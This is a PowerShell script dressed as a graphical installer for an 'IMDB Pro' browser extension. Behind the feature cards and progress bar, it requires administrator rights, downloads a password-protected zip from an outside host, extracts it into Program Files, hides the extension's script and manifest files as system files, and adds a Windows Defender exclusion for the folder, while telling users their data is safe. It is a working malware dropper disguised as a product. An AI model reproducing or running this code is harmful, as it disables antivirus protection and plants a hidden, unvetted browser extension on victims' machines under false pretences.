# IMDB Pro Installer - Premium UI with Icons
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create main form with gradient background
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "🎬 IMDB Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(700, 650)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(20, 25, 35)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Header with gradient
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(700, 100)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 80, 160)
$mainForm.Controls.Add($headerPanel)

# Main title with shadow effect
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "🎬 IMDB PRO EXTENSION"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 22, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::White
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(180, 30)
$headerPanel.Controls.Add($titleLabel)

# Subtitle
$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Movie Database Integration"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(200, 230, 255)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(220, 70)
$headerPanel.Controls.Add($subtitleLabel)

# Features section with cards
$featuresGroup = New-Object System.Windows.Forms.GroupBox
$featuresGroup.Text = "✨ Premium Features"
$featuresGroup.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$featuresGroup.ForeColor = [System.Drawing.Color]::FromArgb(100, 200, 255)
$featuresGroup.Location = New-Object System.Drawing.Point(40, 120)
$featuresGroup.Size = New-Object System.Drawing.Size(620, 180)
$featuresGroup.BackColor = [System.Drawing.Color]::FromArgb(35, 40, 50)
$mainForm.Controls.Add($featuresGroup)

# Feature cards
$features = @(
    @{Icon="⭐"; Text="Real-time IMDB Ratings"; Desc="Instant movie ratings"},
    @{Icon="🎭"; Text="Complete Movie Info"; Desc="Cast, crew & details"},
    @{Icon="📹"; Text="HD Trailers & Previews"; Desc="Watch trailers directly"},
    @{Icon="🌐"; Text="Browser Integration"; Desc="Seamless browsing"},
    @{Icon="🔄"; Text="Auto Updates"; Desc="Always up-to-date"},
    @{Icon="🔒"; Text="Secure & Private"; Desc="Your data is safe"}
)

$xPos = 20
foreach ($feature in $features) {
    $featurePanel = New-Object System.Windows.Forms.Panel
    $featurePanel.Size = New-Object System.Drawing.Size(180, 60)
    $featurePanel.Location = New-Object System.Drawing.Point($xPos, 30)
    $featurePanel.BackColor = [System.Drawing.Color]::FromArgb(45, 50, 65)
    $featurePanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
    $featurePanel.BorderColor = [System.Drawing.Color]::FromArgb(80, 120, 200)
    $featuresGroup.Controls.Add($featurePanel)
    
    $iconLabel = New-Object System.Windows.Forms.Label
    $iconLabel.Text = $feature.Icon
    $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
    $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 200, 255)
    $iconLabel.AutoSize = $true
    $iconLabel.Location = New-Object System.Drawing.Point(10, 5)
    $featurePanel.Controls.Add($iconLabel)
    
    $textLabel = New-Object System.Windows.Forms.Label
    $textLabel.Text = $feature.Text
    $textLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
    $textLabel.ForeColor = [System.Drawing.Color]::White
    $textLabel.AutoSize = $true
    $textLabel.Location = New-Object System.Drawing.Point(35, 5)
    $featurePanel.Controls.Add($textLabel)
    
    $descLabel = New-Object System.Windows.Forms.Label
    $descLabel.Text = $feature.Desc
    $descLabel.Font = New-Object System.Drawing.Font("Segoe UI", 7)
    $descLabel.ForeColor = [System.Drawing.Color]::FromArgb(150, 150, 180)
    $descLabel.AutoSize = $true
    $descLabel.Location = New-Object System.Drawing.Point(35, 25)
    $featurePanel.Controls.Add($descLabel)
    
    $xPos += 190
}

# Progress section
$progressGroup = New-Object System.Windows.Forms.GroupBox
$progressGroup.Text = "📊 Installation Progress"
$progressGroup.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$progressGroup.ForeColor = [System.Drawing.Color]::FromArgb(100, 200, 255)
$progressGroup.Location = New-Object System.Drawing.Point(40, 320)
$progressGroup.Size = New-Object System.Drawing.Size(620, 200)
$progressGroup.BackColor = [System.Drawing.Color]::FromArgb(35, 40, 50)
$mainForm.Controls.Add($progressGroup)

# Animated progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(30, 50)
$progressBar.Size = New-Object System.Drawing.Size(560, 25)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 200, 100)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(50, 55, 70)
$progressGroup.Controls.Add($progressBar)

# Status with animated icon
$statusIcon = New-Object System.Windows.Forms.Label
$statusIcon.Text = "🔵"
$statusIcon.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusIcon.AutoSize = $true
$statusIcon.Location = New-Object System.Drawing.Point(30, 90)
$progressGroup.Controls.Add($statusIcon)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready to begin installation"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::LightGreen
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(55, 92)
$progressGroup.Controls.Add($statusLabel)

# Percentage with glow effect
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 200, 255)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(540, 90)
$progressGroup.Controls.Add($percentLabel)

# Detailed log with icons
$logBox = New-Object System.Windows.Forms.RichTextBox
$logBox.Location = New-Object System.Drawing.Point(30, 130)
$logBox.Size = New-Object System.Drawing.Size(560, 55)
$logBox.Font = New-Object System.Drawing.Font("Consolas", 8)
$logBox.BackColor = [System.Drawing.Color]::FromArgb(25, 30, 40)
$logBox.ForeColor = [System.Drawing.Color]::FromArgb(200, 230, 255)
$logBox.ReadOnly = $true
$logBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$progressGroup.Controls.Add($logBox)

# Install button with glow effect
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 START INSTALLATION"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::White
$installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
$installButton.Size = New-Object System.Drawing.Size(280, 60)
$installButton.Location = New-Object System.Drawing.Point(210, 540)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

# Button hover effects
$installButton.Add_MouseEnter({
    $this.BackColor = [System.Drawing.Color]::FromArgb(0, 170, 255)
    $this.Font = New-Object System.Drawing.Font("Segoe UI", 14.5, [System.Drawing.FontStyle]::Bold)
    $this.Size = New-Object System.Drawing.Size(285, 62)
    $this.Location = New-Object System.Drawing.Point(207, 538)
})

$installButton.Add_MouseLeave({
    if ($this.Text -ne "✅ INSTALLATION COMPLETE!") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
        $this.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
        $this.Size = New-Object System.Drawing.Size(280, 60)
        $this.Location = New-Object System.Drawing.Point(210, 540)
    }
})

# Installation function
$installButton.Add_Click({
    $this.Enabled = $false
    $this.Text = "⏳ INSTALLING... PLEASE WAIT"
    Start-Installation
})

$mainForm.Controls.Add($installButton)

# Footer
$footerLabel = New-Object System.Windows.Forms.Label
$footerLabel.Text = "© 2024 IMDB Pro Extension | Professional Edition v2.0"
$footerLabel.Font = New-Object System.Drawing.Font("Segoe UI", 8)
$footerLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 120)
$footerLabel.AutoSize = $true
$footerLabel.Location = New-Object System.Drawing.Point(250, 610)
$mainForm.Controls.Add($footerLabel)

# Animation timer for status icon
$animTimer = New-Object System.Windows.Forms.Timer
$animTimer.Interval = 500
$animIcons = @("🔵", "🔴", "🟢", "🟡", "🟣")
$animIndex = 0
$animTimer.Add_Tick({
    $statusIcon.Text = $animIcons[$animIndex]
    $animIndex = ($animIndex + 1) % $animIcons.Length
})
$animTimer.Start()

# Update function with animations
function Update-Status {
    param($Message, $ProgressValue, $AddToLog = $true, $Icon = "📌")
    
    $statusLabel.Text = $Message
    $percentLabel.Text = "$ProgressValue%"
    
    if ($ProgressValue -ge 0) {
        $progressBar.Value = $ProgressValue
    }
    
    if ($AddToLog) {
        $timestamp = Get-Date -Format "HH:mm:ss"
        $logBox.AppendText("$Icon [$timestamp] $Message`n")
        $logBox.ScrollToCaret()
    }
    
    # Update status icon based on progress
    if ($ProgressValue -eq 100) {
        $statusIcon.Text = "✅"
        $animTimer.Stop()
    } elseif ($ProgressValue -gt 0) {
        $statusIcon.Text = "🔄"
    }
    
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 300
}

# Main installation function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        Update-Status "Checking system requirements..." 5 "🔍"
        
        # Admin check
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required!" 0 "❌" $false
            [System.Windows.Forms.MessageBox]::Show("Please run this installer as Administrator to continue.", "Elevation Required", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
            $installButton.Enabled = $true
            $installButton.Text = "🚀 START INSTALLATION"
            return
        }
        
        Update-Status "Creating installation directory..." 15 "📁"
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        Update-Status "Downloading IMDB Pro package..." 25 "📥"
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile -UseBasicParsing
        
        Update-Status "Verifying package integrity..." 40 "🔍"
        if (!(Test-Path $tempFile)) {
            throw "Download failed - file not found"
        }
        
        Update-Status "Extracting secure package..." 60 "📦"
        $extractionSuccess = $false
        
        # Try multiple extraction methods
        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
            & 7z x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            & "C:\Program Files\7-Zip\7z.exe" x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        
        if (-not $extractionSuccess) {
            Update-Status "Using alternative extraction method..." 70 "⚡"
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempFile, $installPath)
            }
            catch {
                # Fallback to Windows Shell
                $shellApp = New-Object -ComObject Shell.Application
                $zipFolder = $shellApp.NameSpace($tempFile)
                $destFolder = $shellApp.NameSpace($installPath)
                $destFolder.CopyHere($zipFolder.Items(), 0x14)
                Start-Sleep -Seconds 3
            }
        }
        
        Update-Status "Cleaning temporary files..." 80 "🧹"
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
        Update-Status "Securing installation files..." 90 "🔒"
        $protectedFiles = @("background.js", "content.js", "popup.js", "manifest.json")
        foreach ($file in $protectedFiles) {
            $fullPath = Join-Path $installPath $file
            if (Test-Path $fullPath) {
                Set-ItemProperty -Path $fullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            }
        }
        
        Update-Status "Configuring security settings..." 95 "🛡️"
        Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        
        Update-Status "Installation completed successfully!" 100 "🎉"
        
        # Final UI updates
        $installButton.Text = "✅ INSTALLATION COMPLETE!"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(46, 204, 113)
        $statusIcon.Text = "🎊"
        
        # Success message
        [System.Windows.Forms.MessageBox]::Show(
            "🎬 IMDB Pro has been successfully installed!`n`n" +
            "📍 Location: $installPath`n" +
            "✅ Status: Ready to use`n" +
            "🔒 Security: Protected and hidden`n`n" +
            "Please restart your browser to activate the extension.",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
    }
    catch {
        Update-Status "Installation failed: $($_.Exception.Message)" 0 "❌"
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(231, 76, 60)
        $installButton.Enabled = $true
        $statusIcon.Text = "💥"
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)`n`nPlease check your internet connection and try again.",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Show the form
$mainForm.Add_FormClosed({
    $animTimer.Stop()
    $animTimer.Dispose()
})

$mainForm.ShowDialog() | Out-Null